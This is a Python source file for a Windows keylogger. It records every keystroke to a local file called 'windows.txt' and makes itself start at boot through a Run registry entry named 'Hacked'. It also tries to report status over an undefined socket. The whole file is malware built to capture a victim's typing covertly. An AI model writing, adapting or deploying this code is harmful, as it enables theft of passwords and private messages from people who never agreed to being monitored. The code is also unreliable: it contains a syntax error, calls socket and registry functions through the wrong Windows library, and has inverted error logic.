import time
import ctypes

# Define constants from Windows API
CAPSLOCK = 0x14
NUMLOCK = 0x90
LEFT_SHIFT = 0xA0
RIGHT_SHIFT = 0xA1

# Define key mappings
NUMCHAR = ")!@#$%^&*("
chars_vn = ";=,-./`"
chars_vs = ":+<_>?~"
chars_va = "[\\]\';"
chars_vb = "{|}\""

# Function to set persistence in Windows Registry
def bootRun():
    err = b"Failed\n"
    suc = b"Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
    path = ctypes.create_string_buffer(512)
    ctypes.windll.kernel32.GetModuleFileNameA(None, path, 512)

    try:
        key = ctypes.windll.kernel32.RegOpenKeyA(
            ctypes.c_uint32(0x80000001), ctypes.create_string_buffer(b"Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, 0x20006)
        if not key:
            ctypes.windll.kernel32.RegSetValueExA(key, b"Hacked", 0, 1, path, ctypes.sizeof(path))
            ctypes.windll.kernel32.RegCloseKey(key)
            return ctypes.windll.kernel32.send(sock, suc, len(suc), 0)
        ctypes.windll.kernel32.RegCloseKey(key)
    except:
        ctypes.windll.kernel32.send(sock err, len(err), 0)

# Function to log keys
def logg():
    # Initialize last key state array
    last_key_state = [0] * 0xFF

    # Run indefinitely
    while True:
        # Take a rest for 10 milliseconds
        time.sleep(0.01)

        # Get key state of CAPSLOCK, NUMLOCK, and SHIFT keys
        isCAPSLOCK = ctypes.windll.user32.GetKeyState(CAPSLOCK) & 0xFF > 0
        isNUMLOCK = ctypes.windll.user32.GetKeyState(NUMLOCK) & 0xFF > 0
        isL_SHIFT = ctypes.windll.user32.GetKeyState(LEFT_SHIFT) & 0xFF00 > 0
        isR_SHIFT = ctypes.windll.user32.GetKeyState(RIGHT_SHIFT) & 0xFF00 > 0

        # Checking state of all virtual keys
        for vkey in range(0xFF):
            isPressed = ctypes.windll.user32.GetKeyState(vkey) & 0xFF00 > 0
            showKey = chr(vkey)

            if isPressed == 1 and last_key_state[vkey] == 0:
                # For alphabets
                if vkey >= 0x41 and vkey <= 0x5A:
                    if not isCAPSLOCK:
                        if not isL_SHIFT and not isR_SHIFT:
                            showKey = chr(vkey + 0x20)
                    elif isL_SHIFT or isR_SHIFT:
                        showKey = chr(vkey + 0x20)

                # For num chars
                elif vkey >= 0x30 and vkey <= 0x39:
                    if isL_SHIFT or isR_SHIFT:
                        showKey = NUMCHAR[vkey - 0x30]

                # For right side numpad
                elif vkey >= 0x60 and vkey <= 0x69 and isNUMLOCK:
                    showKey = chr(vkey - 0x30)

                # For printable chars
                elif vkey >= 0xBA and vkey <= 0xC0:
                    if isL_SHIFT or isR_SHIFT:
                        showKey = chars_vs[vkey - 0xBA]
                    else:
                        showKey = chars_vn[vkey - 0xBA]
                elif vkey >= 0xDB and vkey <= 0xDF:
                    if isL_SHIFT or isR_SHIFT:
                        showKey = chars_vb[vkey - 0xDB]
                    else:
                        showKey = chars_va[vkey - 0xDB]

                # For enter key
                elif vkey == 0x0D:
                    showKey = '\n'

                # For other keys, do not print
                elif vkey != 0x20 and vkey != 0x09:
                    showKey = ''

                # Print and save captured key
                if showKey:
                    with open("windows.txt", "a") as kh:
                        kh.write(showKey)

            # Save last state of key
            last_key_state[vkey] = isPressed

# Main function
def main():
    bootRun()  # Set persistence

    # Start keylogger thread
    ctypes.windll.kernel32.CreateThread(None, 0, logg, None, 0, None)

    # Wait indefinitely
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
